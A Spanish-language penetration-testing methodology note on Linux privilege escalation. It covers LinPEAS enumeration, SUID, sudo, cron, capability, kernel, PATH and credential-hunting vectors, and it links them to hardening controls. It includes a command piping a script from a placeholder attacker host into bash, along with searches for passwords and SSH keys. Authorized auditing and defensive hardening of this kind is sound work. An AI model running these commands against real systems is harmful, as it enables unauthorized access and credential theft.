# 04.1 Post-Explotación y Escalada de Privilegios — Linux

## Objetivo

Pasar de un usuario con privilegios limitados a root (o al nivel de privilegio necesario para demostrar impacto), documentando cada vector probado — no solo el que funcionó.

## 1. Enumeración automatizada (punto de partida, no sustituto del análisis manual)

```bash
# Subir y ejecutar
curl http://ATACANTE:8000/linpeas.sh | bash
# o, si no hay red de salida:
./linpeas.sh > /tmp/linpeas_output.txt
```

LinPEAS marca en colores lo más prometedor, pero el criterio de qué perseguir sigue siendo humano — un listado de 2000 líneas sin leer no es un hallazgo.

## 2. Vectores clásicos, de más a menos frecuente en la práctica

### SUID/SGID mal configurados

```bash
find / -perm -4000 -type f 2>/dev/null
# Contrastar cada binario contra GTFOBins:
# https://gtfobins.github.io/#+suid
```

### Sudo mal configurado

```bash
sudo -l
```

Si un binario permitido por `sudo` aparece en GTFOBins con una entrada "sudo", normalmente es escalada directa (ej. `sudo vim` permite `:!bash`).

### Cron jobs con permisos de escritura

```bash
cat /etc/crontab
ls -la /etc/cron.d/
# Si un script lanzado por root (vía cron) es escribible por el usuario actual:
find / -writable -path "*cron*" 2>/dev/null
```

### Kernel y CVEs conocidos

```bash
uname -a
# Contrastar versión contra CVEs conocidos (Dirty Pipe, Dirty COW, PwnKit, etc.)
```

### Capabilities mal asignadas

```bash
getcap -r / 2>/dev/null
# cap_setuid+ep en un binario que pueda ejecutar código = escalada directa
```

### Credenciales en claro / archivos de configuración

```bash
grep -ri "password" /etc/ /opt/ /var/www/ 2>/dev/null | grep -v Binary
find / -name "*.bak" -o -name "*.old" -o -name "id_rsa" 2>/dev/null
cat ~/.bash_history
```

### PATH hijacking

```bash
echo $PATH
# Si un script ejecutado por root llama a un binario sin ruta absoluta y el
# directorio actual (o uno escribible) está en el PATH antes que /usr/bin:
```

## Matriz de vectores

| Vector | Frecuencia observada en la práctica | Dificultad de explotación |
|---|---|---|
| Sudo mal configurado (`sudo -l`) | Alta | Baja — casi siempre trivial vía GTFOBins |
| SUID binario explotable | Alta | Baja-Media |
| Cron job escribible | Media | Baja |
| Credenciales reutilizadas en ficheros de config | Alta | Baja — no es "explotación", es higiene de secretos |
| Kernel exploit | Baja (sistemas parcheados) / Alta (legacy) | Media-Alta, riesgo de crash del sistema |

## 3. Post-explotación: qué registrar una vez se tiene root

- Prueba de impacto mínima y no destructiva (`id`, `whoami`, lectura de un fichero protegido — nunca modificación/borrado salvo que el RoE lo contemple explícitamente).
- Persistencia **NO** se instala salvo que el cliente lo pida expresamente para simular un escenario de APT; en la mayoría de auditorías, demostrar la escalada y revertir cualquier cambio es la norma.
- Captura del camino completo (comandos exactos, en orden) para la sección de PoC del informe.

## Relación con hardening (lado defensivo)

Cada vector de esta lista tiene su contraparte directa en `sec-hardening-network-labs` y en el trabajo de hardening con Ansible post-auditoría (ver el perfil profesional / `profile-career-roadmap`): sudoers con principio de mínimo privilegio, auditoría periódica de SUID, cron jobs con permisos correctos y gestión de secretos fuera del código son controles de **CIS Benchmarks** y **ISO 27001 A.8.2 (privilegios de acceso)** directamente derivados de esta lista.

## Siguiente paso

Para el equivalente en Windows, ver `02-Windows-PrivEsc.md`. Con el objetivo comprometido en profundidad, si hay más segmentos de red accesibles desde este host, continuar en `05-Pivoting-y-Redes-Internas/`.
